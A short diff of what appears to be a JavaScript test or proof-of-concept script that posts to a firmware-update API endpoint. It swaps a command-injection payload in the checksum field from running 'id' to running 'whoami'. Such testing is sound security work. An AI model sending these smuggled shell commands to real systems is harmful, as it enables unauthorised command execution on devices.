@@ -16,7 +16,7 @@ async function main() {
   console.log("Normal response:", normal.data);
 
   console.log("\n== Injection payload in checksum field ==");
-  const payload = `abc123" && id && echo "done`;
+  const payload = `abc123" && whoami && echo "done`;
   const injected = await axios.post(`${BASE}/api/firmware/update`, {
     version: "2.3.1",
     checksum: payload
